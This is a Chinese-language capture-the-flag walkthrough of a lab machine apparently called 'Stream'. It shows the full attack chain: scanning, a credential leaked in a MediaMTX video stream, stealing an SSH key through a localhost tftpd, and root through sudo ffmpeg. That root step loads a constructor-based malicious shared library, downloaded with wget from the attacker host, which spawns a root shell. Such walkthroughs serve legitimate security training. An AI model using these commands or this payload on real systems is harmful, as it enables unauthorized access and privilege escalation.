# 端口探测与服务识别

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                           
[sudo] password for kali:                                          
Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
192.168.205.146 08:00:27:9a:8f:65       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f3:f9:f8       VMware, Inc.
```

扫出目标IP是 192.168.205.146，直接上全端口扫描摸一下底。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p 0-65535 192.168.205.146
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 07:24 -0500
Nmap scan report for 192.168.205.146
Host is up (0.0013s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1935/tcp open  rtmp
8554/tcp open  rtsp-alt
8888/tcp open  sun-answerbook
8889/tcp open  ddi-tcp-2
MAC Address: 08:00:27:9A:8F:65 (Oracle VirtualBox virtual NIC)
```

看到 1935、8554 这种端口，基本能判定是个流媒体服务器了。为了摸清具体跑了什么应用，接着对这几个开放端口做精准的版本和脚本探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -sV -sC -p22,80,1935,8554,8888,8889 192.168.205.146
...
8888/tcp open  http    Golang net/http server
|_http-server-header: mediamtx
...
8889/tcp open  http    Golang net/http server
|_http-server-header: mediamtx
...
```

重点落在 8888 和 8889 端口上，指纹显示跑的是 MediaMTX，这是一个基于 Golang 的开源流媒体服务器。

# 初始突破：截取视频流凭证

MediaMTX 默认通常需要提供一个流名称（stream path）才能访问内容。当时我随手猜了个最常见的默认路径。

直接用浏览器访问了 `http://192.168.205.146:8888/live/`。运气不错猜对了，画面里在循环播放一段视频，里面直接带了一个凭证。靠单身多年的手速截了个屏，拿到了账号密码 `alvinchan: ferdinando`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh alvinchan@192.168.205.146              
...
alvinchan@192.168.205.146's password: 
              _                        
__      _____| | ___ ___  _ __ ___   ___ 
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
                                       
alvinchan@Stream:~$ sudo -l
...
[sudo] password for alvinchan: 
Sorry, user alvinchan may not run sudo on Stream.
```

拿到的凭证直接用来撞 SSH，成功拿到初始 shell。习惯性敲个 `sudo -l`，不出意外地失败了。

# 本地信息收集与横向移动

既然没法直接提权，就先翻看系统里的进程列表，找找有没有本地高权限运行的可疑服务。

```bash
alvinchan@Stream:/tmp$ ps aux
...
 2432 root      0:00 /usr/sbin/in.tftpd -l -l -s /home/treadin -a 127.0.0.1 -u treadin -p
...
```

发现本地起了个 tftpd 服务，绑在 127.0.0.1，而且指定了运行目录是 `/home/treadin`。既然在这个目录里，我第一反应就是去拿另一个用户的 SSH 私钥。

```bash
alvinchan@Stream:/tmp$ tftp 127.0.0.1
tftp> get .ssh/id_rsa
Error code 1: File not found
tftp> get .ssh/id_ed25519
tftp> quit
alvinchan@Stream:/tmp$ ls -la
...
-rw-r--r--    1 alvinchan alvinchan       411 Mar  4 20:53 id_ed25519
-rw-r--r--    1 alvinchan alvinchan         0 Mar  4 20:53 id_rsa
```

尝试获取 `id_rsa` 报错说文件不存在，换成较新的 `id_ed25519` 成功拉下来了。

```bash
alvinchan@Stream:/tmp$ chmod 600 id_ed25519 
alvinchan@Stream:/tmp$ ssh treadin@127.0.0.1 -i id_ed25519 
...                                     
treadin@Stream:~$ id
uid=1001(treadin) gid=1001(treadin) groups=1001(treadin)
```

给私钥改一下 600 权限，直接在靶机内部 SSH 登录到 treadin 用户，横向移动搞定。

# FFmpeg 动态库劫持提权

拿到新用户的shell后，再次检查 sudo 权限配置。

```bash
treadin@Stream:~$ sudo -l
Matching Defaults entries for treadin on Stream:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for treadin:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User treadin may run the following commands on Stream:
    (ALL) NOPASSWD: /usr/bin/ffmpeg
```

发现 treadin 可以免密以 root 身份运行 ffmpeg。查了一下 GTFOBins，ffmpeg 支持通过加载外部的 LADSPA 插件（本质上就是动态链接库）来执行系统命令。准备写个恶意 so 文件，但发现靶机上没有 gcc 环境。

```c
┌──(kali㉿kali)-[/tmp]
└─$ cat lib.c         
#include <unistd.h>
__attribute__((constructor)) void init(){setuid(0);setgid(0);execl("/bin/sh","sh",0);}

┌──(kali㉿kali)-[/tmp]
└─$ gcc -w -fPIC -shared -o lib.so lib.c
```

没办法只能在我的 Kali 上写好代码编译。这段 C 代码利用 `constructor` 属性，让动态库在被加载时优先执行，把 uid 和 gid 设置为 0 然后弹一个 sh。编译成共享库 `lib.so`。

```bash
treadin@Stream:/tmp$ wget 192.168.205.128/lib.so
...
'lib.so' saved
treadin@Stream:/tmp$ chmod +x lib.so
treadin@Stream:/tmp$ sudo /usr/bin/ffmpeg -f lavfi -i anullsrc -af ladspa=file=/tmp/lib.so /tmp/x.wav
...
Input #0, lavfi, from 'anullsrc':
  Duration: N/A, start: 0.000000, bitrate: 705 kb/s
  Stream #0:0: Audio: pcm_u8, 44100 Hz, stereo, u8, 705 kb/s
root@Stream:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

在靶机上把编译好的库 wget 下来并赋权。执行这串配置了 LADSPA 滤镜的 ffmpeg 命令，成功触发了我们写的动态库，弹出了 root shell。

```bash
root@Stream:/tmp# cat /root/root.txt /home/
.status     alvinchan/  treadin/
root@Stream:/tmp# cat /root/root.txt /home/alvinchan/user.txt 
flag{root-6235d8e489b3320dc6636e0fa97984e9}
flag{user-ea08aa574d3cf3e682932bc3b66cbe6f}
```

翻了下 root 目录和 alvinchan 的家目录，顺利读到两个 flag。